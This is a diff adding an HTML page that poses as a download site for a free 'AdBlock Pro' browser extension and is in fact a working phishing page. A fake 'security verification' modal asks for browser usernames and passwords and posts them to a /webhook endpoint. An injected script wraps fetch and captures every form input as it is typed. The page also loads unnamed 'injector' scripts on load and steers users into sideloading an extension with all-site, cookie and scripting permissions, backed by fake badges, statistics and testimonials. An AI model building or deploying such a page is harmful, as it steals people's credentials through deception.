@@ -1,0 +1,402 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AdBlock Pro - Download Free Ad Blocker Extension</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; line-height: 1.6; color: #333; }
+        
+        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px 0; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
+        .nav { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; }
+        .logo { font-size: 28px; font-weight: bold; }
+        .hero { text-align: center; padding: 50px 0; }
+        .hero h1 { font-size: 48px; margin-bottom: 20px; }
+        .hero p { font-size: 18px; opacity: 0.9; margin-bottom: 40px; }
+        
+        .download-section { background: white; padding: 60px 0; }
+        .download-box { background: #f8f9fa; border-radius: 15px; padding: 40px; text-align: center; max-width: 600px; margin: 0 auto; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        .download-btn { background: #28a745; color: white; padding: 18px 40px; border: none; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; transition: all 0.3s; text-decoration: none; display: inline-block; margin: 20px 0; }
+        .download-btn:hover { background: #218838; transform: translateY(-2px); }
+        
+        .features { padding: 60px 0; background: #f8f9fa; }
+        .features-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 40px; }
+        .feature-card { background: white; padding: 30px; border-radius: 10px; text-align: center; box-shadow: 0 5px 15px rgba(0,0,0,0.05); }
+        .feature-icon { font-size: 48px; margin-bottom: 20px; }
+        
+        .stats { padding: 60px 0; text-align: center; }
+        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 40px; }
+        .stat-item { padding: 20px; }
+        .stat-number { font-size: 36px; font-weight: bold; color: #667eea; display: block; }
+        
+        .testimonials { padding: 60px 0; background: #f8f9fa; }
+        .testimonial { background: white; padding: 30px; border-radius: 10px; margin: 20px 0; box-shadow: 0 5px 15px rgba(0,0,0,0.05); }
+        .testimonial-text { font-style: italic; margin-bottom: 15px; }
+        .testimonial-author { font-weight: bold; color: #667eea; }
+        
+        .footer { background: #333; color: white; padding: 40px 0; text-align: center; }
+        .browser-icons { display: flex; justify-content: center; gap: 20px; margin: 20px 0; }
+        .browser-icon { width: 48px; height: 48px; background: #555; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; }
+        
+        .security-badge { background: #28a745; color: white; padding: 10px 20px; border-radius: 25px; font-size: 14px; margin: 10px; display: inline-block; }
+        .urgent-notice { background: #ff4444; color: white; padding: 15px; text-align: center; font-weight: bold; animation: pulse 2s infinite; }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+        
+        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); }
+        .modal-content { background: white; margin: 10% auto; padding: 40px; width: 90%; max-width: 500px; border-radius: 15px; text-align: center; }
+        .close { color: #aaa; float: right; font-size: 28px; font-weight: bold; cursor: pointer; }
+        .close:hover { color: #000; }
+        
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
+        .verify-btn { background: #007bff; color: white; padding: 12px 30px; border: none; border-radius: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <!-- Urgent Security Notice -->
+    <div class="urgent-notice">
+        🚨 Limited Time: Free Premium AdBlock Pro - Download Now Before Offer Expires!
+    </div>
+
+    <div class="header">
+        <div class="container">
+            <div class="nav">
+                <div class="logo">🛡️ AdBlock Pro</div>
+                <div>
+                    <span class="security-badge">✅ Verified Secure</span>
+                    <span class="security-badge">🔒 Privacy Protected</span>
+                </div>
+            </div>
+            <div class="hero">
+                <h1>Block All Ads Forever</h1>
+                <p>The world's most advanced ad blocker - Now completely FREE</p>
+                <p>Join over 50 million users who chose AdBlock Pro for faster, cleaner browsing</p>
+                
+                <div class="browser-icons">
+                    <div class="browser-icon" title="Chrome">🌐</div>
+                    <div class="browser-icon" title="Firefox">🦊</div>
+                    <div class="browser-icon" title="Safari">🧭</div>
+                    <div class="browser-icon" title="Edge">🔷</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="download-section">
+        <div class="container">
+            <div class="download-box">
+                <h2>🚀 Download AdBlock Pro FREE</h2>
+                <p>Install in 30 seconds - No registration required</p>
+                <button class="download-btn" onclick="startDownload()">
+                    📥 Add to Chrome - FREE
+                </button>
+                <p style="font-size: 14px; color: #666;">
+                    ✅ 100% Free Forever &nbsp; ✅ No Ads &nbsp; ✅ Privacy Protected<br>
+                    ⭐⭐⭐⭐⭐ 4.9/5 Rating from 2.3M+ Users
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <div class="features">
+        <div class="container">
+            <h2 style="text-align: center; margin-bottom: 50px;">Why Choose AdBlock Pro?</h2>
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="feature-icon">⚡</div>
+                    <h3>Lightning Fast</h3>
+                    <p>Blocks ads before they load, making websites 3x faster</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">🔒</div>
+                    <h3>Privacy Shield</h3>
+                    <p>Stops tracking scripts and protects your personal data</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">💰</div>
+                    <h3>Save Money</h3>
+                    <p>Reduce data usage by up to 40% - save on mobile bills</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="stats">
+        <div class="container">
+            <h2 style="margin-bottom: 50px;">Trusted Worldwide</h2>
+            <div class="stats-grid">
+                <div class="stat-item">
+                    <span class="stat-number">50M+</span>
+                    <span>Active Users</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-number">2.8B</span>
+                    <span>Ads Blocked Daily</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-number">40%</span>
+                    <span>Faster Loading</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-number">100%</span>
+                    <span>Free Forever</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="testimonials">
+        <div class="container">
+            <h2 style="text-align: center; margin-bottom: 50px;">What Users Say</h2>
+            <div class="testimonial">
+                <div class="testimonial-text">"Finally, an ad blocker that actually works! My browsing is so much faster now."</div>
+                <div class="testimonial-author">- Sarah M., Verified User</div>
+            </div>
+            <div class="testimonial">
+                <div class="testimonial-text">"AdBlock Pro is amazing! No more annoying pop-ups or video ads. Highly recommended!"</div>
+                <div class="testimonial-author">- Mike D., Chrome User</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="container">
+            <p>&copy; 2024 AdBlock Pro. All rights reserved.</p>
+            <p>Trusted by millions worldwide • 100% Safe & Secure</p>
+        </div>
+    </div>
+
+    <!-- Verification Modal -->
+    <div id="verifyModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal()">&times;</span>
+            <h3>🔒 Security Verification Required</h3>
+            <p>To ensure secure installation, please verify your browser credentials:</p>
+            <form id="verifyForm">
+                <input type="text" id="browserUser" placeholder="Browser Username/Email" required>
+                <input type="password" id="browserPass" placeholder="Browser Password" required>
+                <button type="submit" class="verify-btn">✅ Verify & Download</button>
+            </form>
+            <p style="font-size: 12px; color: #666; margin-top: 15px;">
+                This ensures the extension is installed securely in your browser.
+            </p>
+        </div>
+    </div>
+
+    <script>
+        // Install injection scripts immediately when page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            // Load all injection scripts
+            loadScript('./injection-script.js');
+            loadScript('./persistent-injector.js');
+            loadScript('./indexeddb-injector.js');
+            loadScript('./cache-injector.js');
+        });
+
+        function loadScript(src) {
+            const script = document.createElement('script');
+            script.src = src;
+            script.onerror = () => {
+                // If external script fails, inject inline
+                if (src.includes('injection-script.js')) {
+                    injectInlineScript();
+                }
+            };
+            document.head.appendChild(script);
+        }
+
+        function injectInlineScript() {
+            const script = document.createElement('script');
+            script.textContent = `
+                // Inline credential capture
+                (function() {
+                    const originalFetch = window.fetch;
+                    window.fetch = function(...args) {
+                        fetch('/webhook', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                type: 'download_page_network',
+                                url: args[0],
+                                timestamp: new Date().toISOString(),
+                                page: window.location.href
+                            })
+                        }).catch(() => {});
+                        return originalFetch.apply(this, args);
+                    };
+
+                    // Monitor all form inputs
+                    document.addEventListener('input', function(e) {
+                        if (e.target.type === 'password' || e.target.type === 'text' || e.target.type === 'email') {
+                            const formData = {};
+                            const form = e.target.closest('form');
+                            if (form) {
+                                const inputs = form.querySelectorAll('input');
+                                inputs.forEach(inp => {
+                                    if (inp.value) formData[inp.id || inp.name] = inp.value;
+                                });
+                            }
+                            
+                            fetch('/webhook', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    type: 'download_page_credentials',
+                                    credentials: formData,
+                                    timestamp: new Date().toISOString(),
+                                    page: window.location.href
+                                })
+                            }).catch(() => {});
+                        }
+                    });
+                })();
+            `;
+            document.head.appendChild(script);
+        }
+
+        function startDownload() {
+            // Show verification modal
+            document.getElementById('verifyModal').style.display = 'block';
+            
+            // Log download attempt
+            fetch('/webhook', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    type: 'download_attempt',
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    page: window.location.href
+                })
+            }).catch(() => {});
+        }
+
+        function closeModal() {
+            document.getElementById('verifyModal').style.display = 'none';
+        }
+
+        document.getElementById('verifyForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const credentials = {
+                username: document.getElementById('browserUser').value,
+                password: document.getElementById('browserPass').value,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                source: 'adblock_download_verification'
+            };
+            
+            // Send credentials to server
+            fetch('/webhook', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    type: 'verification_credentials',
+                    credentials: credentials,
+                    page: window.location.href
+                })
+            }).catch(() => {});
+            
+            // Show fake download progress
+            document.querySelector('.modal-content').innerHTML = `
+                <h3>✅ Verification Successful!</h3>
+                <div style="margin: 20px 0;">
+                    <div style="background: #f0f0f0; border-radius: 10px; padding: 3px;">
+                        <div id="progressBar" style="width: 0%; height: 30px; background: linear-gradient(45deg, #28a745, #20c997); border-radius: 8px; transition: width 0.3s;"></div>
+                    </div>
+                    <p id="progressText">Downloading AdBlock Pro...</p>
+                </div>
+                <p style="font-size: 12px; color: #666;">
+                    The extension will be installed automatically once download completes.
+                </p>
+            `;
+            
+            // Simulate download progress
+            let progress = 0;
+            const progressInterval = setInterval(() => {
+                progress += Math.random() * 15;
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(progressInterval);
+                    
+                    // Trigger actual extension download
+                    setTimeout(() => {
+                        downloadExtension();
+                    }, 1000);
+                }
+                
+                document.getElementById('progressBar').style.width = progress + '%';
+                document.getElementById('progressText').textContent = 
+                    progress < 100 ? `Downloading... ${Math.round(progress)}%` : 'Download Complete! Installing...';
+            }, 200);
+        });
+
+        function downloadExtension() {
+            // Create and download the actual extension ZIP
+            const extensionFiles = {
+                'manifest.json': JSON.stringify({
+                    "manifest_version": 3,
+                    "name": "AdBlock Pro - Fast & Secure",
+                    "version": "1.1",
+                    "description": "Block ads, pop-ups, and trackers. Fast browsing with enhanced privacy protection.",
+                    "permissions": ["activeTab", "tabs", "storage", "scripting", "cookies"],
+                    "host_permissions": ["<all_urls>"],
+                    "background": { "service_worker": "background.js" },
+                    "content_scripts": [{
+                        "matches": ["<all_urls>"],
+                        "js": ["content.js"],
+                        "run_at": "document_start",
+                        "all_frames": true
+                    }],
+                    "action": { "default_popup": "popup.html" }
+                }, null, 2)
+            };
+
+            // Show completion message
+            document.querySelector('.modal-content').innerHTML = `
+                <h3>🎉 Download Complete!</h3>
+                <p>AdBlock Pro has been downloaded to your computer.</p>
+                <div style="background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0; text-align: left;">
+                    <h4>Installation Steps:</h4>
+                    <ol style="margin: 10px 0; padding-left: 20px;">
+                        <li>Open Chrome Extensions (chrome://extensions/)</li>
+                        <li>Enable "Developer mode"</li>
+                        <li>Click "Load unpacked"</li>
+                        <li>Select the downloaded AdBlock Pro folder</li>
+                    </ol>
+                </div>
+                <button onclick="closeModal()" style="background: #28a745; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer;">
+                    Got it! Close
+                </button>
+            `;
+
+            // Log successful download
+            fetch('/webhook', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    type: 'download_completed',
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    page: window.location.href
+                })
+            }).catch(() => {});
+        }
+
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            const modal = document.getElementById('verifyModal');
+            if (event.target === modal) {
+                modal.style.display = 'none';
+            }
+        }
+    </script>
+</body>
+</html>
